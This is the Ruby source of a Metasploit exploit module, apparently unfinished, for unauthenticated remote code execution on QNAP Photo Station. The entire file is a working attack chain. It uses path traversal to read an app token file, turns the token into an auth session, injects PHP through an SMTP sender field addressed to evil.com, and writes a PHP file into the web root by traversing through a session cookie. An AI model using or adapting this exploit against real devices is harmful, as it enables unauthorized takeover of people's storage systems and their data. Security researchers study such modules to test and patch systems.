##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'QNAP RCE',
        'Description' => %q{
          Unauthenticated RCE on QNAP
        },
        'License' => BSD_LICENSE,
        'Author' => [
          'pending',
        ],
        'Platform' => %w[linux],
        'Arch' => [ARCH_X86, ARCH_X64],
        'SessionTypes' => %w[shell meterpreter],
        'Targets' => [ [ 'Wildcard Target', {} ] ],
        'References' => [],
        'DisclosureDate' => 'Nov 08 2017', #XXX fix this
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of the QNAP Website', '/']),
      ]
    )
  end

  def read_uploaded_file(location, cookies)
    print_status 'Accessing the uploaded file'
    res = send_request_cgi({
      # XXX this needs to use the 'normalize_uri' function
      'uri' => location,
      'method' => 'GET',
      'cookie' => cookies
    })
    if res.code == 200
      res.body
    end
  end

  def write_session_to_location(location)
    print_status 'Writing Session to a file'
    # current_cookie = cli.config['headers']['Cookie']
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'photo', 'slideshow.php'),
      'vars_get' => { 'album' => 'qsamplealbum' },
      'method' => 'POST',
      'cookie' => "QMS_SID=#{location}"

    })
    # p res
    if res && res.code == 200
      true
    end
  end

  def inject_php_in_session(php, authsid, cookies)
    print_status 'Injecting code'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'userConfig.cgi'),
      'vars_get' => { 'sid' => authsid },
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'func' => 'addPersonalSmtp',
        'provider_idx' => 0,
        'sender' => "#{php}@evil.com",
        'default' => 0,
        'smtp_server' => '0.0.0.0',
        'port' => '25',
        'security' => '-1',
        'email_account' => '123123%4013131.com',
        'email_passwd' => '1q2w3e4r'
      }
    })
    # XXX either use res from above or drop it
    # p res
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'sys', 'sysRequest.cgi'),
      'cookie' => cookies,
      'method' => 'POST',
      'vars_post' => {
        'smtp_fw_update' => 0,
        'auth_en' => 1,
        'sender' => "#{php}@evil.com",
        'address1' => '',
        'address2' => '',
        'smtp_serv_ip_port' => 25,
        'plain_text' => 0,
        'alertMailWarning' => 0,
        'provider_idx' => 0,
        'smtp_passwd' => 'yyy',
        'smtp_serv_ip_name' => 'mail',
        'protocol_type' => 'a',
        'sid' => authsid,
        'apply' => 'alertMail',
        'smtp_serv' => 'mail:25',
        'subfunc' => 'notification',
        'ext-gen565' => '',
        'alertMailError' => 0,
        'smtp_username' => 'xxx'
      }
    })
    # p res
    if res && res.code == 200
      true
    end
  end

  def get_sid(token, cookies)
    print_status 'Getting the AuthSID'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'authLogin.cgi'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'app' => 'PHOTO_STATION',
        'auth' => 1,
        'app_token' => token
      }
    })
    # p res
    if res && res.code == 200
      xml_data = res.get_xml_document
      output = xml_data.xpath('//authSid[1]')
      return if output.empty?

      output.inner_text
    end
  end

  def get_token(album_id, access_code, cookies)
    print_status 'Getting the Token'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'video.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'album' => album_id,
        'a' => 'caption',
        'ac' => access_code,
        'f' => 'UMGObv',
        'filename' => './../share/Multimedia/.@__thumb/ps.app.token'
      }
    })
    # p res
    if res && res.code == 200
      res.body
    end
  end

  def get_access_code(album_id, cookies)
    print_status 'Getting the Album Id'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'photo', 'slideshow.php'),
      'vars_get' => { 'album' => album_id },
      'cookie' => cookies
    })
    if res && res.code == 200
      res.body[/(?<=encodeURIComponent\(["']).+(?=['"])/]
    end
  end

  def get_album_id
    print_status 'Getting the Album Id'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'album.php'),
      'method' => 'POST',
      'vars_post' => {
        'a' => 'setSlideshow',
        'f' => 'qsamplealbum'
      }
    })
    # p res
    if res && res.code == 200
      xml_data = res.get_xml_document
      output = xml_data.xpath('//output[1]')
      return if output.empty?

      [output.inner_text, res.get_cookies]
    end
  end

  def exploit

    album_id, cookies = get_album_id
    unless album_id
      print_bad 'Failed to retrieve the Album Id'
      return
    end
    # http.set_config({  })
    print_good "Got Album Id : #{album_id}"

    access_code = get_access_code(album_id, cookies)
    unless access_code
      print_bad 'Failed to retrieve the Access Code'
      return
    end

    print_good "Got Access Code : #{access_code}"

    token = get_token album_id, access_code, cookies
    unless token && !token.empty?
      print_bad 'Failed to retrieve the Token'
      return
    end
    print_good "Got Token : #{token}"

    sid = get_sid token, cookies

    unless sid
      print_bad 'Failed to retrieve the AuthSID'
      return
    end

    print_good "Got SID : #{sid}"

    inject_php_in_session 'payload', sid, cookies

    write_session_to_location 'xxxxx/../../../../../mnt/ext/opt/photostation2/x.php'

    body = read_uploaded_file '/photo/x.php', cookies

    print_status "Got #{body}"
 end

end
